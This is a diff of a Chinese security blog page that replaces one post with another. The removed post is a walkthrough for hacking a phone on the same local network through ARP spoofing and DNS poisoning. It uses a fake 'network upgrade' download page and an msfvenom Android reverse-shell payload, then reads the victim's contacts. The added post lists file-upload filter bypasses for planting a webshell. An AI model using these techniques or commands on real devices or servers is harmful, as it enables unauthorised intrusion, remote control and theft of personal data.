@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>如何黑掉同局域网的手机 · thr0cyte&#39;s bolg</title>
+    <title>文件上传绕过总结 · thr0cyte&#39;s bolg</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >thr0cyte&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">如何黑掉同局域网的手机</a>
+                <a href="#" class="post-name">文件上传绕过总结</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            如何黑掉同局域网的手机
+            文件上传绕过总结
             <!-- 404 -->
             
         </h1>
@@ -266,26 +266,22 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "中间人">中间人</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "dns投毒">dns投毒</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "文件上传">文件上传</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "arp欺骗">arp欺骗</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "反弹shell">反弹shell</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "安卓">安卓</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "拿shell">拿shell</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">386</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/02</span>
+                    <span class="post-intro-time">2018/08/12</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -409,18 +405,26 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>  昨天在B站上看到一个黑手机的视频，突然想起来去年暑假尝试过一次没有成功，刚好刚学完msf框架，今天就来试一下。</p>
-<p>搭好环境后，手机连入网络，开始实验！</p>
-<p>首先进行内网主机发现：<br><img src="/images/hsj1.png" alt=""><br>手机ip是172.20.10.3</p>
-<p>下面进行arp欺骗，让手机去网关的流量经过kali主机<br><img src="/images/hsj2.png" alt=""><br>配置dns投毒攻击：</p>
-<p>gedit /etc/ettercap/etter.dns<br><img src="/images/hsj3.png" alt=""><br>开始在kali伪造木马下载页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;</span><br><span class="line"></span><br><span class="line">网络异常</span><br><span class="line"></span><br><span class="line">&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;font size=&quot;50&quot;&gt;您的网络存在异常&lt;br&gt;</span><br><span class="line"></span><br><span class="line">请下载相应插件升级 &lt;/font&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;/网络升级.apk&quot; download=&quot;网络升级.apk&quot;&gt; &lt;font size=&quot;50&quot;&gt;点击下载&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>开启apache服务</p>
-<p>Service apache2 start</p>
-<p>Msf生成木马：</p>
-<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=172.20.10.11 LPORT=4444 R&gt;网络升级.apk</p>
-<p>将木马移动到网页中：</p>
-<p>mv 网络升级.apk /var/www/html<br><br><br>msf开启监听，等待上钩：<br><img src="/images/hsj4.png" alt=""><br>拿到session了<br><img src="/images/hsj5.png" alt=""><br>停止中间人攻击</p>
-<p>后渗透利用：<br>查看进程：<img src="/images/hsj6.png" alt=""><br>系统信息：<img src="/images/hsj7.png" alt=""><br>读取联系人：<img src="/images/hsj8.png" alt=""><br><img src="/images/hsj9.png" alt=""><br><br><br>到饭点先不玩了，感觉android的后渗透比电脑的麻烦，很多请求都要经过手机的同意，还要考虑隐藏木马app，还要给apk做免杀签名，等后面真实遇到这种渗透环境了再研究吧</p>
+        <p>文件上传漏洞，是指图谋不轨的用户通过web应用的上传文件功能，利用各种绕过技巧，上传了一个可执行的脚本文件，并通过此脚本文件获得执行服务端命令的能力的漏洞。<br>厂商也会通过各种方法对上传文件进行过滤或修改防止文件上传攻击，下面介绍几种绕过姿势：</p>
+<p>一. 设置了客户端检测，利用javascript进行本地的扩展名检测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function checkFileExt(filename)</span><br><span class="line">&#123;var flag = false;</span><br><span class="line">var arr = [&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;];</span><br><span class="line">var index = filename.lastIndexOf(&quot;.&quot;);</span><br><span class="line">var ext = filename.substr(index+1);</span><br><span class="line">for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">&#123;if(ext == arr[i])</span><br><span class="line">&#123; flag = true; //一旦找到合适的，立即退出循环</span><br><span class="line">break; &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(flag)</span><br><span class="line">&#123;document.write(&quot;文件名合法&quot;);&#125;else</span><br><span class="line">&#123;</span><br><span class="line">document.write(&quot;文件名不合法&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以用firebug禁用js</p>
+<p>二 . MIME类型检测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if($_FILES[&apos;userfile&apos;][&apos;type&apos;]!=&quot;image/gif&quot;)&#123;echo&quot;sorry,we only allow uploading gif images&quot;;exit;&#125;</span><br><span class="line">    $uploaddir=&apos;uploads/&apos;;</span><br><span class="line">    $uploadfile=$uploaddir.basename($_FILES[&apos;userfile&apos;][&apos;name&apos;]);</span><br><span class="line">    if(move_uploaded_file($_FILES[&apos;userfile&apos;][&apos;tmp_name&apos;],$uploadfile))&#123;</span><br><span class="line">    echo&quot;file is valid,and was successfully uploaded.\n&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    echo&quot;file uploading failed.\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以通过burp修改request包里的content-type为image/gif或其他它规定的类型绕过</p>
+<p>三 .  url检测<br>对url检测是否合法，可以这样绕：http://………………….1.php%00.gif 通过截断的方式绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">四. 文件扩展名检测：</span><br><span class="line">通常服务器会设置黑名单或白名单：</span><br><span class="line"></span><br><span class="line">黑名单样例：</span><br><span class="line">html|htm|php|php2|php3|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm</span><br><span class="line"></span><br><span class="line">绕过方法：1.文件名大小写：AsP，pHp之类</span><br><span class="line"></span><br><span class="line">2.特殊文件名：test.asp可用test.asp_     .exe可用.exee     test.php可用test.php::$DATA…………….        shell.php可用shell.php&#123;%80-%99&#125;             filename=php.php           filename=”a.jpg”;filename=”a.php”            1.php可用1.php+(+是空格)</span><br><span class="line"></span><br><span class="line">3.长文件名：shell…………………………………….无数个点………………………………………asp</span><br><span class="line"></span><br><span class="line">或者shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</span><br><span class="line"></span><br><span class="line">白名单：</span><br><span class="line">0x00截断绕过，举例：test.asp%00.jpg</span><br><span class="line"></span><br><span class="line">.htaccess文件攻击</span><br><span class="line">建立一个.htaccess文件：</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch&quot;hehe&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">建立一个内容为一句话木马但没有任何后缀名的文件  thehet</span><br><span class="line"></span><br><span class="line">可以用菜刀直接连接</span><br><span class="line"></span><br><span class="line">漏洞原因是因为黑名单不够充分，没有对.htaccess过滤</span><br><span class="line"></span><br><span class="line">利用容器的解析漏洞：</span><br><span class="line">apache2.2.11、apache2.2.17、apache2.2.6:       1.php.abc可以绕过</span><br><span class="line"></span><br><span class="line">apache2.0.59、apache2.2.8:       1.php.abc</span><br><span class="line"></span><br><span class="line">&lt;T&gt;ADO&lt;/T&gt;</span><br><span class="line">&lt;C&gt;&lt;/C&gt;</span><br><span class="line">可绕过</span><br><span class="line"></span><br><span class="line">iis6.0:   1.asp;xxxxxxxxxx可绕过</span><br><span class="line"></span><br><span class="line">2.test.asp目录下一个内容为一句话木马的无后缀文件可以激活菜刀</span><br><span class="line"></span><br><span class="line">3.目录名包含.asp\.asa\.cer的话会使用asp解析</span><br><span class="line"></span><br><span class="line">iis7.0\7.5:上传两次，iis会取第一个作为接收参数，waf会取最后一个</span><br><span class="line"></span><br><span class="line">content-disposition:form-data;name=&quot;file&quot;;filename=&quot;shell.php&quot;</span><br><span class="line">content-disposition:form-data;name=&quot;file&quot;;filename=&quot;shell.jpg&quot;</span><br><span class="line">nginx解析漏洞：（php应用默认配置导致的漏洞，所以最好这样设置：cgi.fix_pathinfo=0）</span><br><span class="line"></span><br><span class="line">访问/test.jpg/notexist.php时，会把test.jpg当作php进行解析（notexist.php是不存在的文件）</span><br></pre></td></tr></table></figure></p>
+<p>五. 文件内容检测<br>1.文件幻数检测<br>jpg文件开头幻数是FF D8 FF E0 00 10 4A 46 49 46</p>
+<p>gif文件开头幻数是47 49 46 38 39 61</p>
+<p>png文件开头幻数89 50 4E 47</p>
+<p>在文件幻数后加上一些文件信息再添加一句话木马就可以绕过</p>
+<p>2.文件加载检测<br>可以用winhex打开图片，在空白区填充一句话木马就可以绕过渲染测试</p>
+<p>针对二次渲染测试（抓取图片信息部分，再用自己的函数重新渲染），可以对文件加载器进行溢出攻击</p>
+<p>六. Boundary边界检测<br>content-type:multipart/form-data;boundary=————————————————-47146314211411730218525550999<br>加空格或其他可被正常处理的字符绕过</p>
+<p>或者伪造两端不一样的bundary，waf会认为数据无意义，容器可能会带入</p>
+<p>content-type:multipart/form-data;boundary=————————————————-471463142ddd11411730218525550999<br>content-length:222<br>————————————————-47146314211411730218525550999<br>七.  特殊绕过<br>1.filename放在content-type下面</p>
+<p>2.boundary和content-disposition中间插入换行</p>
+<p>3.name=\n”file”;filename=”a.php”</p>
+<p>4.content-disposition:\n</p>
+<p>5.a.jpg.\nphp</p>
+<p>6.去掉content-disposition的form-data字段</p>
 
     </article>
     <!-- license  -->
@@ -430,16 +434,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/24/安恒杯7月赛writeup/" title= "安恒杯7月赛writeup">
-                    <div class="nextTitle">安恒杯7月赛writeup</div>
+                <a href= "/2018/08/27/安恒杯八月赛应急响应流量包分析writeup/" title= "安恒杯八月赛应急响应流量包分析writeup">
+                    <div class="nextTitle">安恒杯八月赛应急响应流量包分析writeup</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/06/26/安恒杯6月赛web题writeup/" title= "安恒杯6月赛web题writeup">
-                    <div class="prevTitle">安恒杯6月赛web题writeup</div>
+                <a href= "/2018/08/01/security-考后心得/" title= "security+考后心得">
+                    <div class="prevTitle">security+考后心得</div>
                 </a>
             
         </li>
